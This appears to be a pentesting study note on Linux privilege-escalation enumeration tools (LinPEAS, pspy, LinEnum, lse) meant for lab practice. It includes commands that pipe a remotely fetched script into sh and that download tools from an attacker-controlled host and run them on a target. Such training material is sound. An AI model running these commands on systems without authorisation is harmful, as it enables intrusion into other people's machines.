# Linux PrivEsc tools — automated enumeration

Use tools to surface findings fast, then understand and manually verify before exploiting. A tool output you cannot explain is a finding you cannot use.

## LinPEAS

The most comprehensive Linux enumeration script. Highlights findings in red (critical) and yellow (interesting).

```bash
# Run directly via curl (requires internet on target — lab use)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transfer method (preferred — no internet on target needed)
# On attacker:
python3 -m http.server 8080
# On target:
wget http://<LHOST>:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out

# Save output for review
/tmp/linpeas.sh 2>&1 | tee /tmp/out.txt
```

Focus areas in output: red highlights, sudo section, SUID section, cron section, credentials section.

## pspy — process spy without root

Watches process creation in real time. Reveals cron jobs and root-executed commands.

```bash
# Transfer and run
wget http://<LHOST>:8080/pspy64
chmod +x pspy64
./pspy64           # watch for root UID=0 events
./pspy64 -p -i 1000    # also watch file system events, 1s interval

# Download: https://github.com/DominicBreuker/pspy/releases
```

Let it run for 2-5 minutes — cron jobs may fire on a schedule.

## LinEnum

Older but still useful, generates a detailed HTML or text report.

```bash
wget http://<LHOST>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t      # thorough mode
./LinEnum.sh -r report -t    # save report to file

# Download: https://github.com/rebootuser/LinEnum
```

## linux-smart-enumeration (lse)

Levels of detail on demand. Level 0 = just interesting findings. Level 2 = everything.

```bash
wget http://<LHOST>:8080/lse.sh
chmod +x lse.sh
./lse.sh -l 1      # level 1: detailed relevant findings
./lse.sh -l 2      # level 2: full output

# Download: https://github.com/diego-treitos/linux-smart-enumeration
```

## Transferring tools to target

```bash
# Attacker — serve files
python3 -m http.server 8080

# Target — fetch
wget http://LHOST:8080/tool
curl http://LHOST:8080/tool -o tool

# SCP (if SSH is available)
scp linpeas.sh user@target:/tmp/linpeas.sh
```

## Manual vs automated

Automated tools surface candidates — manual understanding is mandatory before exploitation. If LinPEAS flags a SUID binary, look up GTFObins yourself to confirm the technique. Never run an exploit you cannot explain.

Practice: TryHackMe Linux PrivEsc room — run LinPEAS, then trace every finding back to the manual command that would have found it.
